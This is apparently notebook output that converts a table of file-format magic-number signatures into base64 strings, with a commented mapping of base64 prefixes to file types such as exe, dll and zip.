# In: 00 00 01 00 Bytes: b'\x00\x00\x01\x00' Out: AAABAA== type <class 'str'>
# In: 66 74 79 70 33 67 Bytes: b'ftyp3g' Out: ZnR5cDNn type <class 'str'>
# In: 1F 9D Bytes: b'\x1f\x9d' Out: H50= type <class 'str'>
# In: 1F A0 Bytes: b'\x1f\xa0' Out: H6A= type <class 'str'>
# In: 42 41 43 4B 4D 49 4B 45 44 49 53 4B Bytes: b'BACKMIKEDISK' Out: QkFDS01JS0VESVNL type <class 'str'>
# In: 42 5A 68 Bytes: b'BZh' Out: Qlpo type <class 'str'>
# In: 47 49 46 38 37 61 47 49 46 38 39 61 Bytes: b'GIF87aGIF89a' Out: R0lGODdhR0lGODlh type <class 'str'>
# endian
# ['49 49 2A 00 (little endian format)4D 4D 00 2A ', '']
# Exception
# In: 49 49 2A 00 (little endian format)4D 4D 00 2A (big endian format) Bytes: b'\x00' Out: None type <class 'NoneType'>
# In: 49 49 2A 00 10 00 00 00 43 52 Bytes: b'II*\x00\x10\x00\x00\x00CR' Out: SUkqABAAAABDUg== type <class 'str'>
# In: 80 2A 5F D7 Bytes: b'\x80*_\xd7' Out: gCpf1w== type <class 'str'>
# In: 52 4E 43 01 52 4E 43 02 Bytes: b'RNC\x01RNC\x02' Out: Uk5DAVJOQwI= type <class 'str'>
# endian
# ['53 44 50 58 ', ' 58 50 44 53 (little endian format)']
# Exception
# In: 53 44 50 58 (big endian format) 58 50 44 53 (little endian format) Bytes: b'\x00' Out: None type <class 'NoneType'>
# In: 76 2F 31 01 Bytes: b'v/1\x01' Out: di8xAQ== type <class 'str'>
# In: 42 50 47 FB Bytes: b'BPG\xfb' Out: QlBH+w== type <class 'str'>
# wild_cards 2
# Exception
# In: FF D8 FF DB FF D8 FF E0 00 10 4A 46 49 46 00 01FF D8 FF EE FF D8 FF E1 ?? ?? 45 78 69 66 00 00 Bytes: b'\x00' Out: None type <class 'NoneType'>
# wild_cards 4
# Exception
# In: 46 4F 52 4D ?? ?? ?? ?? 49 4C 42 4D Bytes: b'\x00' Out: None type <class 'NoneType'>
# wild_cards 4
# Exception
# In: 46 4F 52 4D ?? ?? ?? ?? 38 53 56 58 Bytes: b'\x00' Out: None type <class 'NoneType'>
# wild_cards 4
# Exception
# In: 46 4F 52 4D ?? ?? ?? ?? 41 43 42 4D Bytes: b'\x00' Out: None type <class 'NoneType'>
# wild_cards 4
# Exception
# In: 46 4F 52 4D ?? ?? ?? ?? 41 4E 42 4D Bytes: b'\x00' Out: None type <class 'NoneType'>
# wild_cards 4
# Exception
# In: 46 4F 52 4D ?? ?? ?? ?? 41 4E 49 4D Bytes: b'\x00' Out: None type <class 'NoneType'>
# wild_cards 4
# Exception
# In: 46 4F 52 4D ?? ?? ?? ?? 46 41 58 58 Bytes: b'\x00' Out: None type <class 'NoneType'>
# wild_cards 4
# Exception
# In: 46 4F 52 4D ?? ?? ?? ?? 46 54 58 54 Bytes: b'\x00' Out: None type <class 'NoneType'>
# wild_cards 4
# Exception
# In: 46 4F 52 4D ?? ?? ?? ?? 53 4D 55 53 Bytes: b'\x00' Out: None type <class 'NoneType'>
# wild_cards 4
# Exception
# In: 46 4F 52 4D ?? ?? ?? ?? 43 4D 55 53 Bytes: b'\x00' Out: None type <class 'NoneType'>
# wild_cards 4
# Exception
# In: 46 4F 52 4D ?? ?? ?? ?? 59 55 56 4E Bytes: b'\x00' Out: None type <class 'NoneType'>
# wild_cards 4
# Exception
# In: 46 4F 52 4D ?? ?? ?? ?? 46 41 4E 54 Bytes: b'\x00' Out: None type <class 'NoneType'>
# wild_cards 4
# Exception
# In: 46 4F 52 4D ?? ?? ?? ?? 41 49 46 46 Bytes: b'\x00' Out: None type <class 'NoneType'>
# In: 49 4E 44 58 Bytes: b'INDX' Out: SU5EWA== type <class 'str'>
# In: 4C 5A 49 50 Bytes: b'LZIP' Out: TFpJUA== type <class 'str'>
# In: 4D 5A Bytes: b'MZ' Out: TVo= type <class 'str'>
# Exception
# In: 50 4B 03 04 50 4B 05 06 (empty archive) 50 4B 07 08 (spanned archive) Bytes: b'\x00' Out: None type <class 'NoneType'>
# In: 52 61 72 21 1A 07 00 Bytes: b'Rar!\x1a\x07\x00' Out: UmFyIRoHAA== type <class 'str'>
# In: 52 61 72 21 1A 07 01 00 Bytes: b'Rar!\x1a\x07\x01\x00' Out: UmFyIRoHAQA= type <class 'str'>
# In: 7F 45 4C 46 Bytes: b'\x7fELF' Out: f0VMRg== type <class 'str'>
# In: 89 50 4E 47 0D 0A 1A 0A Bytes: b'\x89PNG\r\n\x1a\n' Out: iVBORw0KGgo= type <class 'str'>
# In: CA FE BA BE Bytes: b'\xca\xfe\xba\xbe' Out: yv66vg== type <class 'str'>
# In: EF BB BF Bytes: b'\xef\xbb\xbf' Out: 77u/ type <class 'str'>
# In: FE ED FA CE Bytes: b'\xfe\xed\xfa\xce' Out: /u36zg== type <class 'str'>
# In: FE ED FA CF Bytes: b'\xfe\xed\xfa\xcf' Out: /u36zw== type <class 'str'>
# In: CE FA ED FE Bytes: b'\xce\xfa\xed\xfe' Out: zvrt/g== type <class 'str'>
# In: CF FA ED FE Bytes: b'\xcf\xfa\xed\xfe' Out: z/rt/g== type <class 'str'>
# In: FF FE Bytes: b'\xff\xfe' Out: //4= type <class 'str'>
# In: FF FE 00 00 Bytes: b'\xff\xfe\x00\x00' Out: //4AAA== type <class 'str'>
# In: 25 21 50 53 Bytes: b'%!PS' Out: JSFQUw== type <class 'str'>
# In: 25 50 44 46 2d 0a Bytes: b'%PDF-\n' Out: JVBERi0K type <class 'str'>
# In: 30 26 B2 75 8E 66 CF 11 A6 D9 00 AA 00 62 CE 6C Bytes: b'0&\xb2u\x8ef\xcf\x11\xa6\xd9\x00\xaa\x00b\xcel' Out: MCaydY5mzxGm2QCqAGLObA== type <class 'str'>
# In: 24 53 44 49 30 30 30 31 Bytes: b'$SDI0001' Out: JFNESTAwMDE= type <class 'str'>
# In: 4F 67 67 53 Bytes: b'OggS' Out: T2dnUw== type <class 'str'>
# In: 38 42 50 53 Bytes: b'8BPS' Out: OEJQUw== type <class 'str'>
# wild_cards 4
# Exception
# In: 52 49 46 46 ?? ?? ?? ?? 57 41 56 45 Bytes: b'\x00' Out: None type <class 'NoneType'>
# wild_cards 4
# Exception
# In: 52 49 46 46 ?? ?? ?? ?? 41 56 49 20 Bytes: b'\x00' Out: None type <class 'NoneType'>
# In: FF FB Bytes: b'\xff\xfb' Out: //s= type <class 'str'>
# In: 49 44 33 Bytes: b'ID3' Out: SUQz type <class 'str'>
# In: 42 4D Bytes: b'BM' Out: Qk0= type <class 'str'>
# In: 43 44 30 30 31 Bytes: b'CD001' Out: Q0QwMDE= type <class 'str'>
# In: 53 49 4D 50 4C 45 20 20 3D 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 54 Bytes: b'SIMPLE  =                    T' Out: U0lNUExFICA9ICAgICAgICAgICAgICAgICAgICBU type <class 'str'>
# In: 66 4C 61 43 Bytes: b'fLaC' Out: ZkxhQw== type <class 'str'>
# In: 4D 54 68 64 Bytes: b'MThd' Out: TVRoZA== type <class 'str'>
# In: D0 CF 11 E0 A1 B1 1A E1 Bytes: b'\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1' Out: 0M8R4KGxGuE= type <class 'str'>
# In: 64 65 78 0A 30 33 35 00 Bytes: b'dex\n035\x00' Out: ZGV4CjAzNQA= type <class 'str'>
# In: 4B 44 4D Bytes: b'KDM' Out: S0RN type <class 'str'>
# In: 43 72 32 34 Bytes: b'Cr24' Out: Q3IyNA== type <class 'str'>
# In: 41 47 44 33 Bytes: b'AGD3' Out: QUdEMw== type <class 'str'>
# In: 05 07 00 00 42 4F 42 4F 05 07 00 00 00 00 00 00 00 00 00 00 00 01 Bytes: b'\x05\x07\x00\x00BOBO\x05\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01' Out: BQcAAEJPQk8FBwAAAAAAAAAAAAAAAQ== type <class 'str'>
# In: 06 07 E1 00 42 4F 42 4F 06 07 E1 00 00 00 00 00 00 00 00 00 00 01 Bytes: b'\x06\x07\xe1\x00BOBO\x06\x07\xe1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01' Out: BgfhAEJPQk8GB+EAAAAAAAAAAAAAAQ== type <class 'str'>
# In: 45 52 02 00 00 00 8B 45 52 02 00 00 00 Bytes: b'ER\x02\x00\x00\x00\x8bER\x02\x00\x00\x00' Out: RVICAAAAi0VSAgAAAA== type <class 'str'>
# In: 78 01 73 0D 62 62 60 Bytes: b'x\x01s\rbb`' Out: eAFzDWJiYA== type <class 'str'>
# In: 78 61 72 21 Bytes: b'xar!' Out: eGFyIQ== type <class 'str'>
# In: 50 4D 4F 43 43 4D 4F 43 Bytes: b'PMOCCMOC' Out: UE1PQ0NNT0M= type <class 'str'>
# In: 4E 45 53 1A Bytes: b'NES\x1a' Out: TkVTGg== type <class 'str'>
# In: 75 73 74 61 72 00 30 30 75 73 74 61 72 20 20 00 Bytes: b'ustar\x0000ustar  \x00' Out: dXN0YXIAMDB1c3RhciAgAA== type <class 'str'>
# In: 74 6F 78 33 Bytes: b'tox3' Out: dG94Mw== type <class 'str'>
# In: 4D 4C 56 49 Bytes: b'MLVI' Out: TUxWSQ== type <class 'str'>
# In: 44 43 4D 01 50 41 33 30 Bytes: b'DCM\x01PA30' Out: RENNAVBBMzA= type <class 'str'>
# In: 37 7A BC AF 27 1C Bytes: b"7z\xbc\xaf'\x1c" Out: N3q8rycc type <class 'str'>
# In: 1F 8B Bytes: b'\x1f\x8b' Out: H4s= type <class 'str'>
# In: FD 37 7A 58 5A 00 00 Bytes: b'\xfd7zXZ\x00\x00' Out: /Td6WFoAAA== type <class 'str'>
# In: 04 22 4D 18 Bytes: b'\x04"M\x18' Out: BCJNGA== type <class 'str'>
# In: 4D 53 43 46 Bytes: b'MSCF' Out: TVNDRg== type <class 'str'>
# In: 53 5A 44 44 88 F0 27 33 Bytes: b"SZDD\x88\xf0'3" Out: U1pERIjwJzM= type <class 'str'>
# In: 46 4C 49 46 Bytes: b'FLIF' Out: RkxJRg== type <class 'str'>
# In: 1A 45 DF A3 Bytes: b'\x1aE\xdf\xa3' Out: GkXfow== type <class 'str'>
# In: 4D 49 4C 20 Bytes: b'MIL ' Out: TUlMIA== type <class 'str'>
# wild_cards 4
# Exception
# In: 41 54 26 54 46 4F 52 4D ?? ?? ?? ?? 44 4A 56 Bytes: b'\x00' Out: None type <class 'NoneType'>
# In: 30 82 Bytes: b'0\x82' Out: MII= type <class 'str'>
# In: 44 49 43 4D Bytes: b'DICM' Out: RElDTQ== type <class 'str'>
# In: 77 4F 46 46 Bytes: b'wOFF' Out: d09GRg== type <class 'str'>
# In: 77 4F 46 32 Bytes: b'wOF2' Out: d09GMg== type <class 'str'>
# In: 3c 3f 78 6d 6c 20 Bytes: b'<?xml ' Out: PD94bWwg type <class 'str'>
# In: 00 61 73 6d Bytes: b'\x00asm' Out: AGFzbQ== type <class 'str'>
# In: cf 84 01 Bytes: b'\xcf\x84\x01' Out: z4QB type <class 'str'>
# In: 43 57 53 46 57 53 Bytes: b'CWSFWS' Out: Q1dTRldT type <class 'str'>
# In: 21 3C 61 72 63 68 3E Bytes: b'!<arch>' Out: ITxhcmNoPg== type <class 'str'>
# wild_cards 4
# Exception
# In: 52 49 46 46 ?? ?? ?? ?? 57 45 42 50 Bytes: b'\x00' Out: None type <class 'NoneType'>
# In: 27 05 19 56 Bytes: b"'\x05\x19V" Out: JwUZVg== type <class 'str'>
# In: 7B 5C 72 74 66 31 Bytes: b'{\\rtf1' Out: e1xydGYx type <class 'str'>
# In: 54 41 50 45 Bytes: b'TAPE' Out: VEFQRQ== type <class 'str'>
# In: 47 Bytes: b'G' Out: Rw== type <class 'str'>
# In: 00 00 01 BA Bytes: b'\x00\x00\x01\xba' Out: AAABug== type <class 'str'>
# In: 00 00 01 BA4700 00 01 B3 Bytes: b'\x00\x00\x01\xbaG\x00\x00\x01\xb3' Out: AAABukcAAAGz type <class 'str'>
# In: 78 0178 9C78 DA Bytes: b'x\x01x\x9cx\xda' Out: eAF4nHja type <class 'str'>
# In: 62 76 78 32 Bytes: b'bvx2' Out: YnZ4Mg== type <class 'str'>
# In: 4F 52 43 Bytes: b'ORC' Out: T1JD type <class 'str'>
# In: 4F 62 6A 01 Bytes: b'Obj\x01' Out: T2JqAQ== type <class 'str'>
# In: 53 45 51 36 Bytes: b'SEQ6' Out: U0VRNg== type <class 'str'>
# In: 65 87 78 56 Bytes: b'e\x87xV' Out: ZYd4Vg== type <class 'str'>
# In: 55 55 aa aa Bytes: b'UU\xaa\xaa' Out: VVWqqg== type <class 'str'>
# In: 78 56 34 Bytes: b'xV4' Out: eFY0 type <class 'str'>
# In: 50 41 52 31 Bytes: b'PAR1' Out: UEFSMQ== type <class 'str'>
# In: 45 4D 58 32 Bytes: b'EMX2' Out: RU1YMg== type <class 'str'>
# In: 45 4D 55 33 Bytes: b'EMU3' Out: RU1VMw== type <class 'str'>
# In: 1B 4C 75 61 Bytes: b'\x1bLua' Out: G0x1YQ== type <class 'str'>
# In: 62 6F 6F 6B 62 6F 6F 6B 00 00 00 00 6D 61 72 6B Bytes: b'bookbook\x00\x00\x00\x00mark' Out: Ym9va2Jvb2sAAAAAbWFyaw== type <class 'str'>
# In: 5B 5A 6F 6E 65 54 72 61 6E 73 66 65 72 5D Bytes: b'[ZoneTransfer]' Out: W1pvbmVUcmFuc2Zlcl0= type <class 'str'>
# In: 52 65 63 65 69 76 65 64 Bytes: b'Received' Out: UmVjZWl2ZWQ= type <class 'str'>
# In: 20 02 01 62 A0 1E AB 07 02 00 00 00 Bytes: b' \x02\x01b\xa0\x1e\xab\x07\x02\x00\x00\x00' Out: IAIBYqAeqwcCAAAA type <class 'str'>
# In: 28 B5 2F FD Bytes: b'(\xb5/\xfd' Out: KLUv/Q== type <class 'str'>
#                                          Hex signature  \
# 0                              a1 b2 c3 d4 d4 c3 b2 a1
# 1                                          0a 0d 0d 0a
# 2                                          ed ab ee db
# 3                                          53 50 30 31
# 4                                                   00
# 5    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0...
# 6                                          BE BA FE CA
# 7                                          00 01 42 44
# 8                                          00 01 44 54
# 9                                          00 01 00 00
# 10                                         00 00 01 00
# 11                                   66 74 79 70 33 67
# 12                                               1F 9D
# 13                                               1F A0
# 14                 42 41 43 4B 4D 49 4B 45 44 49 53 4B
# 15                                            42 5A 68
# 16                 47 49 46 38 37 61 47 49 46 38 39 61
# 17   49 49 2A 00 (little endian format)4D 4D 00 2A ...
# 18                       49 49 2A 00 10 00 00 00 43 52
# 19                                         80 2A 5F D7
# 20                             52 4E 43 01 52 4E 43 02
# 21   53 44 50 58 (big endian format) 58 50 44 53 (l...
# 22                                         76 2F 31 01
# 23                                         42 50 47 FB
# 24   FF D8 FF DB FF D8 FF E0 00 10 4A 46 49 46 00 0...
# 25                 46 4F 52 4D ?? ?? ?? ?? 49 4C 42 4D
# 26                 46 4F 52 4D ?? ?? ?? ?? 38 53 56 58
# 27                 46 4F 52 4D ?? ?? ?? ?? 41 43 42 4D
# 28                 46 4F 52 4D ?? ?? ?? ?? 41 4E 42 4D
# 29                 46 4F 52 4D ?? ?? ?? ?? 41 4E 49 4D
# ..                                                 ...
# 97                                         77 4F 46 32
# 98                                   3c 3f 78 6d 6c 20
# 99                                         00 61 73 6d
# 100                                           cf 84 01
# 101                                  43 57 53 46 57 53
# 102                               21 3C 61 72 63 68 3E
# 103                52 49 46 46 ?? ?? ?? ?? 57 45 42 50
# 104                                        27 05 19 56
# 105                                  7B 5C 72 74 66 31
# 106                                        54 41 50 45
# 107                                                 47
# 108                                        00 00 01 BA
# 109                           00 00 01 BA4700 00 01 B3
# 110                                    78 0178 9C78 DA
# 111                                        62 76 78 32
# 112                                           4F 52 43
# 113                                        4F 62 6A 01
# 114                                        53 45 51 36
# 115                                        65 87 78 56
# 116                                        55 55 aa aa
# 117                                           78 56 34
# 118                                        50 41 52 31
# 119                                        45 4D 58 32
# 120                                        45 4D 55 33
# 121                                        1B 4C 75 61
# 122    62 6F 6F 6B 62 6F 6F 6B 00 00 00 00 6D 61 72 6B
# 123          5B 5A 6F 6E 65 54 72 61 6E 73 66 65 72 5D
# 124                            52 65 63 65 69 76 65 64
# 125                20 02 01 62 A0 1E AB 07 02 00 00 00
# 126                                        28 B5 2F FD
#
#                              ISO 8859-1                               Offset  \
# 0                             ¡²ÃÔ ÔÃ²¡                                    0
# 1                                  ....                                    0
# 2                                  ....                                    0
# 3                                  SP01                                    0
# 4                                     .                                    0
# 5            ........ ........ ........                                   11
# 6                                   ...                                    0
# 7                                  ..BD                                    0
# 8                                  ..DT                                    0
# 9                                   ...                                    0
# 10                                 ....                                    0
# 11                               ftyp3g                                    4
# 12                                   ..                                    0
# 13                                   ..                                    0
# 14                        BACKMIKE DISK                                    0
# 15                                  BZh                                    0
# 16                        GIF87a GIF89a                                    0
# 17                            II*. MM.*                                    0
# 18                          II*..... CR                                    0
# 19                                 .*_.                                    0
# 20                                 RNC.                                    0
# 21                            SDPX XPDS                                    0
# 22                                 v/1.                                    0
# 23                                 BPGû                                    0
# 24   ÿØÿÛ ÿØÿà..JFIF..ÿØÿî ÿØÿá..Exif..                                    0
# 25                        FORM.... ILBM                                0 any
# 26                        FORM.... 8SVX                                0 any
# 27                        FORM.... ACBM                                0 any
# 28                        FORM.... ANBM                                0 any
# 29                        FORM.... ANIM                                0 any
# ..                                  ...                                  ...
# 97                                 wOF2                                    0
# 98                                <?xml                                    0
# 99                                 .asm                                    0
# 100                                 NaN                                    0
# 101                             CWS FWS                                    0
# 102                            !<arch>.                                    0
# 103                       RIFF.... WEBP                                    0
# 104                                '..V                                    0
# 105                              {\rtf1                                    0
# 106                                TAPE                                    0
# 107                                   G  0 0xBC 0x178 ... (every 188th byte)
# 108                                ....                                    0
# 109                           ....G....                                    0
# 110                                ....                                    0
# 111                                bvx2                                    0
# 112                                 ORC                                    0
# 113                                Obj.                                    0
# 114                                SEQ6                                    0
# 115                                e.xV                                    0
# 116                                UU¬¬                                    0
# 117                                 xV4                                    0
# 118                                PAR1                                    0
# 119                                EMX2                                    0
# 120                                EMU3                                    0
# 121                                .Lua                                    0
# 122                           book mark                                    0
# 123                      [ZoneTransfer]                                    0
# 124                           Received:                                    0
# 125                         ..b .«.....                                    0
# 126                                (µ/ý                                    0
#
#                                File extension  \
# 0                                        pcap
# 1                                      pcapng
# 2                                         rpm
# 3                                         bin
# 4                                PICPIFSEAYTR
# 5                                         PDB
# 6                                         DBA
# 7                                         DBA
# 8                                         TDA
# 9                                         NaN
# 10                                        ico
# 11                                     3gp3g2
# 12                                     ztar.z
# 13                                     ztar.z
# 14                                        bac
# 15                                        bz2
# 16                                        gif
# 17                                    tiftiff
# 18                                        cr2
# 19                                        cin
# 20                                        NaN
# 21                                        dpx
# 22                                        exr
# 23                                        bpg
# 24                                    jpgjpeg
# 25                              ilbmlbmibmiff
# 26                           8svx8svsvxsndiff
# 27                                    acbmiff
# 28                                    anbmiff
# 29                                    animiff
# ..                                        ...
# 97                                      woff2
# 98                                        XML
# 99                                       wasm
# 100                                       lep
# 101                                       swf
# 102                                       deb
# 103                                      webp
# 104                                       NaN
# 105                                       rtf
# 106                                       NaN
# 107                                ts tsv tsa
# 108                                   m2p vob
# 109                                  mpg mpeg
# 110                                      zlib
# 111                                     lzfse
# 112                                       orc
# 113                                      avro
# 114                                        rc
# 115                                   p25 obt
# 116                                       pcv
# 117  pbt pdt pea peb pet pgt pict pjt pkt pmt
# 118                                       NaN
# 119                                       ez2
# 120                                   ez3 iso
# 121                                      luac
# 122                                     alias
# 123                                Identifier
# 124                                       eml
# 125                                       tde
# 126                                       zst
#
#                                            Description  \
# 0                               Libpcap File Format[1]
# 1             PCAP Next Generation Dump File Format[2]
# 2             RedHat Package Manager (RPM) package [3]
# 3                     Amazon Kindle Update Package [4]
# 4    IBM Storyboard bitmap file Windows Program Inf...
# 5                     PalmPilot Database/Document File
# 6                        Palm Desktop Calendar Archive
# 7                           Palm Desktop To Do Archive
# 8                        Palm Desktop Calendar Archive
# 9               Palm Desktop Data File (Access format)
# 10         Computer icon encoded in ICO file format[5]
# 11   3rd Generation Partnership Project 3GPP and 3G...
# 12   compressed file (often tar zip) using Lempel-Z...
# 13   Compressed file (often tar zip) using LZH algo...
# 14   File or tape containing a backup done with Ami...
# 15               Compressed file using Bzip2 algorithm
# 16   Image file encoded in the Graphics Interchange...
# 17                            Tagged Image File Format
# 18   Canon RAW Format Version 2[7]Canon's RAW forma...
# 19                                  Kodak Cineon image
# 20   Compressed file using Rob Northen Compression ...
# 21                                     SMPTE DPX image
# 22                                       OpenEXR image
# 23                  Better Portable Graphics format[9]
# 24         JPEG raw or in the JFIF or Exif file format
# 25                        IFF Interleaved Bitmap Image
# 26                             IFF 8-Bit Sampled Voice
# 27                             Amiga Contiguous Bitmap
# 28                                 IFF Animated Bitmap
# 29                                   IFF CEL Animation
# ..                                                 ...
# 97                                WOFF File Format 2.0
# 98   eXtensible Markup Language when using the ASCI...
# 99                       WebAssembly binary format[40]
# 100                   Lepton compressed JPEG image[41]
# 101                                         flash .swf
# 102                                     linux deb file
# 103                             Google WebP image file
# 104  U-Boot / uImage. Das U-Boot Universal Boot Loa...
# 105                                   Rich Text Format
# 106                              Microsoft Tape Format
# 107              MPEG Transport Stream (MPEG-2 Part 1)
# 108  MPEG Program Stream (MPEG-1 Part 1 (essentiall...
# 109  MPEG Program Stream MPEG Transport Stream MPEG...
# 110  No Compression/low Default Compression Best Co...
# 111  LZFSE - Lempel-Ziv style data compression algo...
# 112    Apache ORC (Optimized Row Columnar) file format
# 113                     Apache Avro binary file format
# 114                        RCFile columnar file format
# 115                          PhotoCap Object Templates
# 116                                    PhotoCap Vector
# 117                                  PhotoCap Template
# 118                Apache Parquet columnar file format
# 119                         Emulator Emaxsynth samples
# 120                         Emulator III synth samples
# 121                                   Lua bytecode[44]
# 122               macOS file Alias[45] (Symbolic link)
# 123  Microsoft Zone Identifier for URL Security Zon...
# 124                             Email Message var5[47]
# 125                                 Tableau Datasource
# 126                  Zstandard compressed file[48][49]
#
#                      EncodedSignature
# 0                         obLD1NTDsqE
# 1                              Cg0NCg
# 2                              7avu2w
# 3                              U1AwMQ
# 4                                  AA
# 5    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# 6                              vrr+yg
# 7                              AAFCRA
# 8                              AAFEVA
# 9                              AAEAAA
# 10                             AAABAA
# 11                           ZnR5cDNn
# 12                                H50
# 13                                H6A
# 14                   QkFDS01JS0VESVNL
# 15                               Qlpo
# 16                   R0lGODdhR0lGODlh
# 17                               None
# 18                     SUkqABAAAABDUg
# 19                             gCpf1w
# 20                        Uk5DAVJOQwI
# 21                               None
# 22                             di8xAQ
# 23                             QlBH+w
# 24                               None
# 25                               None
# 26                               None
# 27                               None
# 28                               None
# 29                               None
# ..                                ...
# 97                             d09GMg
# 98                           PD94bWwg
# 99                             AGFzbQ
# 100                              z4QB
# 101                          Q1dTRldT
# 102                        ITxhcmNoPg
# 103                              None
# 104                            JwUZVg
# 105                          e1xydGYx
# 106                            VEFQRQ
# 107                                Rw
# 108                            AAABug
# 109                      AAABukcAAAGz
# 110                          eAF4nHja
# 111                            YnZ4Mg
# 112                              T1JD
# 113                            T2JqAQ
# 114                            U0VRNg
# 115                            ZYd4Vg
# 116                            VVWqqg
# 117                              eFY0
# 118                            UEFSMQ
# 119                            RU1YMg
# 120                            RU1VMw
# 121                            G0x1YQ
# 122            Ym9va2Jvb2sAAAAAbWFyaw
# 123               W1pvbmVUcmFuc2Zlcl0
# 124                       UmVjZWl2ZWQ
# 125                  IAIBYqAeqwcCAAAA
# 126                            KLUv/Q
#
# [127 rows x 6 columns]

# %%
# base64_header_types = {
#     'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA+AAAAA4fug': 'exe',
#     'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8AAAAA4fug': 'dll',
#     'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6AAAAA4fug': 'sys',
#     'UEsDBBQAAAAIA': 'zip',
#     'UEsDBBQAAQAIA': 'zip (passprotected)',
#     'H4sI': 'gz',
#     'N3q8ryccAAR': '7z',
#     'UmFyIRoHAM': 'rar',
#     'JVBERi0xLjcNC': 'pdf',
#     '0M8R4KGxGuE': 'msi',
#     'TVNXSU0AAADQ': 'wim'}

file_signatures[90:]
# Out:
#                                        Hex signature       ISO 8859-1  \
# 90                                       46 4C 49 46             FLIF
# 91                                       1A 45 DF A3             .Eß£
# 92                                       4D 49 4C 20              MIL
# 93      41 54 26 54 46 4F 52 4D ?? ?? ?? ?? 44 4A 56  AT&TFORM....DJV
# 94                                             30 82               0.
# 95                                       44 49 43 4D             DICM
# 96                                       77 4F 46 46             wOFF
# 97                                       77 4F 46 32             wOF2
# 98                                 3c 3f 78 6d 6c 20            <?xml
# 99                                       00 61 73 6d             .asm
# 100                                         cf 84 01              NaN
# 101                                43 57 53 46 57 53          CWS FWS
# 102                             21 3C 61 72 63 68 3E         !<arch>.
# 103              52 49 46 46 ?? ?? ?? ?? 57 45 42 50    RIFF.... WEBP
# 104                                      27 05 19 56             '..V
# 105                                7B 5C 72 74 66 31           {\rtf1
# 106                                      54 41 50 45             TAPE
# 107                                               47                G
# 108                                      00 00 01 BA             ....
# 109                         00 00 01 BA4700 00 01 B3        ....G....
# 110                                  78 0178 9C78 DA             ....
# 111                                      62 76 78 32             bvx2
# 112                                         4F 52 43              ORC
# 113                                      4F 62 6A 01             Obj.
# 114                                      53 45 51 36             SEQ6
# 115                                      65 87 78 56             e.xV
# 116                                      55 55 aa aa             UU¬¬
# 117                                         78 56 34              xV4
# 118                                      50 41 52 31             PAR1
# 119                                      45 4D 58 32             EMX2
# 120                                      45 4D 55 33             EMU3
# 121                                      1B 4C 75 61             .Lua
# 122  62 6F 6F 6B 62 6F 6F 6B 00 00 00 00 6D 61 72 6B        book mark
# 123        5B 5A 6F 6E 65 54 72 61 6E 73 66 65 72 5D   [ZoneTransfer]
# 124                          52 65 63 65 69 76 65 64        Received:
# 125              20 02 01 62 A0 1E AB 07 02 00 00 00      ..b .«.....
# 126                                      28 B5 2F FD             (µ/ý
#
#                                   Offset  \
# 90                                     0
# 91                                     0
# 92                                     0
# 93                                     0
# 94                                     0
# 95                                  0x80
# 96                                     0
# 97                                     0
# 98                                     0
# 99                                     0
# 100                                    0
# 101                                    0
# 102                                    0
# 103                                    0
# 104                                    0
# 105                                    0
# 106                                    0
# 107  0 0xBC 0x178 ... (every 188th byte)
# 108                                    0
# 109                                    0
# 110                                    0
# 111                                    0
# 112                                    0
# 113                                    0
# 114                                    0
# 115                                    0
# 116                                    0
# 117                                    0
# 118                                    0
# 119                                    0
# 120                                    0
# 121                                    0
# 122                                    0
# 123                                    0
# 124                                    0
# 125                                    0
# 126                                    0
#
#                                File extension  \
# 90                                       flif
# 91                          mkvmkamksmk3dwebm
# 92                                        stg
# 93                                    djvudjv
# 94                                        der
# 95                                        dcm
# 96                                       woff
# 97                                      woff2
# 98                                        XML
# 99                                       wasm
# 100                                       lep
# 101                                       swf
# 102                                       deb
# 103                                      webp
# 104                                       NaN
# 105                                       rtf
# 106                                       NaN
# 107                                ts tsv tsa
# 108                                   m2p vob
# 109                                  mpg mpeg
# 110                                      zlib
# 111                                     lzfse
# 112                                       orc
# 113                                      avro
# 114                                        rc
# 115                                   p25 obt
# 116                                       pcv
# 117  pbt pdt pea peb pet pgt pict pjt pkt pmt
# 118                                       NaN
# 119                                       ez2
# 120                                   ez3 iso
# 121                                      luac
# 122                                     alias
# 123                                Identifier
# 124                                       eml
# 125                                       tde
# 126                                       zst
#
#                                            Description        EncodedSignature
# 90                          Free Lossless Image Format                  RkxJRg
# 91            Matroska media container, including WebM                  GkXfow
# 92   "SEAN : Session Analysis" Training file. Also ...                  TUlMIA
# 93   DjVu documentThe following byte is either 55 (...                    None
# 94                       DER encoded X.509 certificate                     MII
# 95                           DICOM Medical File Format                  RElDTQ
# 96                                WOFF File Format 1.0                  d09GRg
# 97                                WOFF File Format 2.0                  d09GMg
# 98   eXtensible Markup Language when using the ASCI...                PD94bWwg
# 99                       WebAssembly binary format[39]                  AGFzbQ
# 100                   Lepton compressed JPEG image[40]                    z4QB
# 101                                         flash .swf                Q1dTRldT
# 102                                     linux deb file              ITxhcmNoPg
# 103                             Google WebP image file                    None
# 104  U-Boot / uImage. Das U-Boot Universal Boot Loa...                  JwUZVg
# 105                                   Rich Text Format                e1xydGYx
# 106                              Microsoft Tape Format                  VEFQRQ
# 107              MPEG Transport Stream (MPEG-2 Part 1)                      Rw
# 108  MPEG Program Stream (MPEG-1 Part 1 (essentiall...                  AAABug
# 109  MPEG Program Stream MPEG Transport Stream MPEG...            AAABukcAAAGz
# 110  No Compression/low Default Compression Best Co...                eAF4nHja
# 111  LZFSE - Lempel-Ziv style data compression algo...                  YnZ4Mg
# 112    Apache ORC (Optimized Row Columnar) file format                    T1JD
# 113                     Apache Avro binary file format                  T2JqAQ
# 114                        RCFile columnar file format                  U0VRNg
# 115                          PhotoCap Object Templates                  ZYd4Vg
# 116                                    PhotoCap Vector                  VVWqqg
# 117                                  PhotoCap Template                    eFY0
# 118                Apache Parquet columnar file format                  UEFSMQ
